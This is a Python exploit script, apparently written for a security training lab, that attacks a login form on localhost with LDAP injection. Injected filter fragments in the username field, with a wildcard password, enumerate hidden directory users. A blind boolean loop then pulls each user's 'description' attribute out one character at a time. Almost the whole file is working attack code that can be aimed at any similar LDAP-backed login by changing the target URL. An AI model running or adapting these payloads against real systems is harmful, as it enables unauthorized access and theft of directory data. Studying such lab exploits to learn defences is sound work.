```python
"""
LAB: Lab 3 - Attribute Discovery & Filter Hijacking
TYPE: LDAP Injection (Discovery + Blind Extraction)
AUTHOR: [Sithum Ranasinghe]
DESCRIPTION: 
    1. Discovers hidden users by bypassing objectClass restrictions.
    2. Exfiltrates the 'description' attribute using Blind Boolean logic.
"""

import requests
import sys
import string
from bs4 import BeautifulSoup

# --- Configuration ---
TARGET_URL = "http://localhost:5000/"
KNOWN_USERS = ["admin", "alice"] # Users we already know and want to ignore

def discover_hidden_users(url):
    """
    Fuzzes the directory to find users not in the KNOWN_USERS list.
    Technique: Filter Hijacking payload '*)(cn={char}*'
    """
    charset = string.ascii_lowercase
    discovered_list = []
    
    print(f"[*] Starting Discovery on: {url}")
    print(f"[*] Ignoring known users: {KNOWN_USERS}")
    print("-" * 60)

    for char in charset:
        # Payload Logic:
        # 1. '*)' closes the developer's objectClass filter.
        # 2. '(cn={char}*)' starts our own search for names starting with {char}.
        payload_str = f"*)(cn={char}*"
        
        data = {
            "username": payload_str,
            "password": "*"
        }
        
        # Send Request
        response = requests.post(url, data=data)
        
        # Parse Response
        if "SUCCESS:" in response.text:
            soup = BeautifulSoup(response.text, 'html.parser')
            # Extract text from <h2> tag: "SUCCESS: <username>"
            status_text = soup.find(lambda t: t.name == 'h2' and "SUCCESS" in t.text).text
            username = status_text.split("SUCCESS: ")[1].strip()
            
            if username not in KNOWN_USERS and username not in discovered_list:
                print(f"[+] DISCOVERED HIDDEN USER: {username}")
                discovered_list.append(username)

    print("-" * 60)
    print(f"[*] Discovery Complete. Found {len(discovered_list)} hidden user(s).\n")
    return discovered_list

def extract_secret(url, target_users):
    """
    Dumps the 'description' attribute for the first user in the list.
    Technique: Blind Boolean Inference.
    """
    if not target_users:
        print("[-] No users to extract from.")
        return

    target_user = target_users[0]
    print(f"[*] Initiating Secret Extraction for: {target_user}")
    
    # We remove '*' from charset to avoid breaking the LDAP filter logic
    full_charset = string.ascii_letters + string.digits + string.punctuation + " "
    safe_charset = full_charset.replace("*", "") 
    
    extracted_secret = ""
    
    # Loop to extract up to 100 characters (arbitrary limit)
    for _ in range(100):
        found_char = False
        
        for char in safe_charset:
            # Payload Logic:
            # Checks if description starts with currently extracted string + guess
            payload_str = f"{target_user})(description={extracted_secret}{char}*"
            
            data = {
                "username": payload_str,
                "password": "*"
            }
            
            response = requests.post(url, data=data)
            
            # Visual Feedback
            sys.stdout.write(f"\r[>] Current Data: {extracted_secret}{char}")
            sys.stdout.flush()
            
            # Oracle Check
            if "SUCCESS" in response.text:
                found_char = True
                extracted_secret += char
                break
        
        if not found_char:
            print("\n" + "-" * 60)
            print(f"[+] EXFILTRATION COMPLETE")
            print(f"[+] SECRET: {extracted_secret}")
            return

if __name__ == "__main__":
    # Phase 1: Discovery
    hidden_users = discover_hidden_users(TARGET_URL)
    
    # Phase 2: Extraction
    extract_secret(TARGET_URL, hidden_users)
```